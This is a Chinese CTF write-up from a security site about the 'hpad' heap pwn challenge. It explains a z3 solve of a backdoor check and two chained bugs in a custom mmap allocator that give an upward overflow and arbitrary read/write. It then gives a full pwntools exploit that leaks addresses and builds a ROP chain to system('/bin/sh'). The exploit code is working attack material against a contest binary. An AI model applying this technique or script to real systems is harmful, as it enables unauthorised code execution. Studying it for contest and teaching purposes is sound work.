# 津门杯线下AWD hpad Writeup

阅读量 **165235**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-06 10:00:43

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01ebe61fb4d23966ed.jpg)

## hpad

###  题目一览

程序实现了三种堆块模式，对应着三种不同的申请模式。

![](https://p5.ssl.qhimg.com/t017d15d2fa974c0d6f.png)

并且选择一种模式后，再也无法返回到这一层菜单，因此我们无需考虑到程序的联动操作，而是可以把题目分成三部分来单独分析。

他的实现比较复杂，这里主要提及我所发现的漏洞——来自功能3。

本文虽然是主要分析第三种管理方式，也暂时还没有发现其他管理方式存在的漏洞，但是建议各位读者也研究一下其代码，提升一下自己的代码分析能力。

这道题的Libc版本是: 2.31-0ubuntu9.2_amd64

###  修正Switch跳转表

在分析前，可以注意到IDA伪代码没能够成功识别出程序中的switch语句，我相信各位在之前的逆向分析过程中，也遇到过这样的问题，这里提供一种我的解决方法。

![](https://p1.ssl.qhimg.com/t0181e6c4f96a42ea78.png)

IDA这样显示的主要原因就是因为没有识别出这段switch结构中所用的跳转表

![](https://p2.ssl.qhimg.com/t0188a52d281d7f53f6.png)

大概是因为IDA官方也知道自己的程序对于某些switch的识别存在问题，所以提供了一个自带的工具（Specify switch
idiom）让我们来辅助IDA完成识别

![](https://p1.ssl.qhimg.com/t01ab2438293675cc4f.png)

这一段内容的配置大家需要结合代码内容进行设置，我这里就不花大的篇幅来讲如何配置。

以下是我的配置内容，读者可以参考一下

![](https://p1.ssl.qhimg.com/t015b0b0033dd7e2084.png)

###

## 漏洞分析

![](https://p2.ssl.qhimg.com/t013ec59c89f02b35e3.png)

稍微调整符号并配置识别Switch跳转表这对于我们分析功能提供了许多的便利。

在这部分代码中，我们很容易的就可以看到当我们输入666的时候可以跳转到程序的backdoor函数，这一般都是必须会用到的重要功能，一般这个函数的内容可以辅助我们找到程序的漏洞的大致方向。

###  backdoor函数

这个函数的内容函数比较清晰的

![](https://p1.ssl.qhimg.com/t01def00e7e60e85bb5.png)

backdoor
函数实际上在做的就是读取8个字节的随机数，然后把随机数使用encode函数进行加密，并且输出加密后的内容，要求你回答加密前的内容并进行校验。

![](https://p1.ssl.qhimg.com/t0105c1891b475ad850.png)

如果回答正确就可以获得一个free_list的地址，这个地址存放在bss段上，我们也可以借此来泄露出PIE基址。

###  encode函数

所以我们现在需要来分析encode函数的操作内容

![](https://p5.ssl.qhimg.com/t01ce7f1686da1711dd.png)

这个encode函数实际是提供了一个复杂的方程，我一眼也看不出什么端倪来。

所以在比赛过程中，使用z3来解决这个问题应该是比较好的选择

这部分内容，我在比赛过程中卡了好一段时间，问题就出在了题目是使用逻辑左移和逻辑右移，但是如果把上述代码直接复制到z3中，z3默认的右移操作符（>>）对应的是算数右移，因此就导致了计算的误差，最终无法计算出正确的结果。

在比赛过程中是小蓝蓝师傅帮助解决的（orz），我因为对这部分内容不够了解，甚至打算使用莽夫的方式，不断爆破攻击，直到一次计算出有解。

![](https://p0.ssl.qhimg.com/t01a336b9c54d6fc885.png)

但是爆破攻击会浪费的时间会特别多，同时这对于批量攻击脚本的编写也是一种挑战。因此我在这里想要稍微的介绍一下这部分知识。

**逻辑右移和算数右移**

以下用 移动1位操作来说明这三种移位方式的不同处，移动n位的操作以此可推

逻辑左移：所有位往左移动1位，直接丢弃最高位，在最低位补0

逻辑右移：所有位往右移动1位，直接丢弃最低位，在最高位补0

算数右移：所有位往右移动1位，直接丢弃最低位，如果是负数，最高位（符号位）补1；如果是正数，最高位（符号位）补0

根据上面的操作可以看出，在无论正负的情况下，符号位不会影响到左移操作，因此左移与有无符号无关，操作都是使用逻辑左移。

**汇编方面：**

逻辑左移：`shl`

逻辑右移：`shr`

算数右移：`sar`

**Z3 Python操作符：**

有符号 | 无符号  
---|---  
< | ULT  
<= | ULE  
> | UGT  
>= | UGE  
/ | UDiv  
% | URem  
>> | LShR  
<< | <<  
  
**Solver脚本**

    
    
    solver = Solver()
    a1 = BitVec('a1', 64)
    v1 = (LShR((a1 ^ (32 * a1)), 13)) ^ a1 ^ (32 * a1)
    solver.add((LShR((v1 ^ (v1 << 29)), 15) ^ v1 ^ (v1 << 29)) == int(q, 16))
    solver.check()
    ans = solver.model()
    sh.send(p64(ans[a1].as_long()))
    

###  漏洞1

这道题是先使用mmap申请一块0x1000长度的空间，然后自主管理这段空间，而问题也在于这个0x1000是有限的长度，是会被分配干净的，程序并没有做分配完之后的相关逻辑操作。

因此也导致了漏洞的存在，漏洞就在于以下代码中（0x0000000000001890）

![](https://p2.ssl.qhimg.com/t017cf888dcde2fde4d.png)

简单的来说就是，没有判定 **将要申请的长度是否大于现有的剩余空间**
，这就会造成当前申请出来的堆块，而可能实际空间没有那么多。也就是在读入数据的过程中，可能会超出mmap申请的0x1000长度，从而引发错误，这个错误会造成读入失败，但是具体会发生什么，我们不得而知。

###  漏洞2

看到了上面的漏洞之后，也算是有了个大概的方向，我们想办法能够触发这个漏洞，那接下来需要分析的就是read_content函数（0x00000000000014C0）

这个漏洞相当的隐蔽，也需要足够的逻辑分析能力才能找到。

![](https://p4.ssl.qhimg.com/t01dc6402b8232f5577.png)

漏洞就在以上代码中，读者可以尝试着先观察一下，思考在什么情况下这段代码会存在问题。

没错，当read函数内部出现错误，也就是返回了0xFFFFFFFFFFFFFFFF的时候，这段代码就存在问题。

也就是说，在代码中的read_size = -1时，就会执行 i += read_size（i = i –
1），让读取的位置往回走1个字节，这样我们就可以从预期指针之上开始读取数据，就达到向上溢出的目的。

同时，这段代码在一般的错误的时候可能就会陷入一个死循环（一直产生异常），但是在这题中，配合了上面的漏洞，且两者结合起来，最后却能够巧妙的利用！

但是我们不知道在这个read读取超过了mmap申请的size之后会发生什么，于是我猜测：

**这个错误在read函数内会被处理，并且返回-1，同时仍然记录着本次的输入，等待下一次再次调用read的时候读入这部分的内容。**

并且编写以下代码来验证以上的猜想

    
    
    #include <sys/mman.h>
    #include <stdio.h>
    #include <memory.h>
    
    int main(int argc, char *argv[])
    {
        char *m;
        m = (char *)mmap(0x20000000, 0x1000, 3, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
        if (m == MAP_FAILED)
        {
            perror("map mem");
            m = NULL;
            return 0;
        }
    
        int num1 = read(0, m + 0xFF0, 0x100);
        printf("%d\n", num1);
        int num2 = read(0, m, 0x100);
        printf("%d\n", num2);
        munmap(m, 0x1000);
        return 0;
    }
    

我们输入内容 ‘a’ * 0x10 + 换行 的时候，程序给出的运行结果是

    
    
    wjh@ubuntu:~/Desktop$ ./a.out
    aaaaaaaaaaaaaaaa
    -1
    17
    

和预想的结果一致，证明我们的猜想是正确的  
注意：读者在使用gdb调试的时候，第一次read读入失败的内容会被gdb的输入命令窗口吞掉，所以就不会被读入到第二次read中了，所以可能会在第二个read处等待输入。

###  结合利用

![](https://p2.ssl.qhimg.com/t01a9e85afc319be82c.png)

在程序的malloc函数中，我们发现有一个函数会遍历释放的堆块链表，并且从链表头部依次往下寻找，直到找到一个和申请size相同的释放堆块就返回，如果没找到就会从剩余空间中申请。

而我们通过这两个漏洞的结合，就得到了一个向上溢出的机会，我们可以利用这个链表， **向上溢出到Remove堆块后的堆块链上的指针**
，并且指向bss段上来记录堆块地址的空间，因为得到这一段空间就相当于得到了任意读写权限。

而我们如果要申请出这一段空间，那么首先要符合的要求就是size相同，我们这里考虑利用程序在初始化中的\x7f来作为size标志（就像绕过fastbins
size check一样），这样在我们申请0x68大小的堆块的时候，就可以取出我们伪造的堆块。

![](https://p5.ssl.qhimg.com/t01c8b609506bd9a0b4.png)

![](https://p4.ssl.qhimg.com/t01ced2b341109bb4e7.png)

![](https://p0.ssl.qhimg.com/t01e35a0216631052cf.png)

###  任意读写后的攻击方法

有了任意读写权限后，接下来应该就有很多种做法了。

因为程序没有用到glibc中的堆，所以打 **malloc_hook和** free_hook是不可取的。

并且程序使用exit退出，也无法使用IO_FILE来打。

我们这里可以考虑用exit hook 或者修改栈的方式，但是由于程序有edit只能修改0x10字节的限制，所以两种方法都会比较麻烦一些。

## EXP

我的exp用的是使用泄露栈地址，再构建rop的方式来getshell。

EXP中包含了我修改后的LibcSearcher库，用来解决我平时在使用LibcSearcher过程中遇到的问题，我就暂时叫他LibcSearcherEx吧。

详细介绍和安装见：[https://github.com/wjhwjhn/LibcSearcher](https://github.com/wjhwjhn/LibcSearcher?fileGuid=RdHjDGYdjVkjG6xC)

    
    
    from pwn import *
    from LibcSearcher import *
    from z3 import *
    elf = None
    libc = None
    file_name = "./hpad"
    def get_file():
        global elf
        context.binary = file_name
        elf = context.binary
    def get_libc():
        global libc
        if context.arch == 'amd64':
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        elif context.arch == 'i386':
            try:
                libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
            except:
                libc = ELF("/lib32/libc.so.6", checksec=False)
    def get_sh(Use_other_libc=False, Use_ssh=False):
        global libc
        if args['REMOTE']:
            if Use_other_libc:
                libc = ELF("./libc.so.6", checksec=False)
            if Use_ssh:
                s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
                return s.process(file_name)
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process(file_name)
    def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                    int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if libc == True:
            return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
        elif int_mode:
            return_address = int(sh.recvuntil(end_string, drop=True), 16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.recvrepeat(0.3)
        sh.sendline('cat flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh, gdbscript=None, addr=0, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript=gdbscript)
        else:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
            log.success("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
        if stop:
            raw_input()
    def heapbase(sh):
        if args['REMOTE']:
            return 0
        infomap = os.popen("cat /proc/{}/maps".format(sh.pid)).read()
        data = re.search(".*\[heap\]", infomap)
        if data:
            heapaddr = data.group().split("-")[0]
            return int(heapaddr, 16)
        else:
            return 0
    def libcbase():
        if args['REMOTE']:
            return 0
        infomap = os.popen("cat /proc/{}/maps".format(sh.pid)).read()
        data = re.search(".*libc.*\.so", infomap)
        if data:
            libcaddr = data.group().split("-")[0]
            return int(libcaddr, 16)
        else:
            return 0
    def Attack(sh=None, ip=None, port=None):
        pwn(sh)
        flag = get_flag(sh)
        return flag
    def set_libc():
        os.system('patchelf --set-interpreter libc/ld.so --set-rpath libc/ ' + file_name)
    def choice(sh, idx):
        sh.sendlineafter("Choice", str(idx))
    def add(sh, size, content):
        choice(sh, 1)
        sh.sendlineafter("Size:", str(size))
        sh.sendlineafter("Content:", content)
    def delete(sh, idx):
        choice(sh, 3)
        sh.sendlineafter("Index: ", str(idx))
    def show(sh, idx):
        choice(sh, 2)
        sh.sendlineafter("Index: ", str(idx))
    def edit(sh, idx, content):
        choice(sh, 4)
        sh.sendlineafter("Index: ", str(idx))
        if len(content) < 0x10:
            content += '\n'
        sh.sendafter("Content:", content)
    def pwn(sh):
        global libc, elf
        context.log_level = "debug"
        # get_libc()
        # get_file()
        choice(sh, 3)
        choice(sh, 666)
    
        sh.recvuntil('question: ')
        que = sh.recvuntil('\n')
        q = hex(int(que))
        solver = Solver()
        a1 = BitVec('a1', 64)
        v1 = (LShR((a1 ^ (32 * a1)), 13)) ^ a1 ^ (32 * a1)
        solver.add((LShR((v1 ^ (v1 << 29)), 15) ^ v1 ^ (v1 << 29)) == int(q, 16))
        solver.check()
        ans = solver.model()
        sh.send(p64(ans[a1].as_long()))
    
        sh.recvuntil('0x')
        pie_addr = int(sh.recvuntil('\n', drop=True, timeout=1), 16) - 0x6140
        if pie_addr == 0:
            raise EOFError
        log.success("pie_addr:\t" + hex(pie_addr))
    
        add(sh, 0xF00, "a")  # 0
        add(sh, 0x40, "b")  # 1
        add(sh, 0x40, "c")  # 2
        delete(sh, 1)
        delete(sh, 2)
        add(sh, 0x100, p64(0x50) + p64(pie_addr + 0x6125) + '\x00' * (0x90 - 1))  # 1
        add(sh, 0x40, "d")  # 2
        add(sh, 0x60, '\x00' * 0x2B + p64(pie_addr + 0x5f28) + p64(pie_addr + 0x6170))  # 3 got@free
    
        #leak libc
        show(sh, 0)
        free_addr = get_address(sh, True, info="free_addr:\t")
        libc = LibcSearcher('free', free_addr, 2)
        edit(sh, 1, p64(libc.sym['__environ']))
    
        #leak stack_addr
        show(sh, 2)
        stack_addr = get_address(sh, True, offset=-0x150, info="ret_addr:\t")
        pop_rdi_addr = pie_addr + 0x2C93
        edit(sh, 1, p64(stack_addr) + p64(stack_addr + 0x10))
        edit(sh, 3, p64(pop_rdi_addr + 1) + p64(libc.sym['system']))
        # get_gdb(sh, "b *" + hex(pie_addr + 0x000000000001C88))
        edit(sh, 2, p64(pop_rdi_addr) + p64(libc.sym['str_bin_sh']))
        sh.interactive()
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh)
        sh.close()
        log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
    

## 总结

这道题不算是这次比赛中最难的题目，但是其利用的精妙以及两个漏洞的结合利用令我受益匪浅。这两个漏洞，单独拿出一个来都不足以达到getshell的效果，但是两者结合居然有如此强大的威力。结合这几次的AWD或AWDP比赛可以发现，现在PWN题目对RE的要求已经是越来越高了，希望读者可以仔细的研究这道题的代码逻辑，以求在比赛中可以快速的解题。（在比赛中我就没做出来55555，希望下次能够给力一点！）

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wjh** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/243013](/post/id/243013)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [AWD](/tag/AWD)

 **+1** __6赞

 __收藏

![](https://p4.ssl.qhimg.com/t0162586615c462960c.png) wjh

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

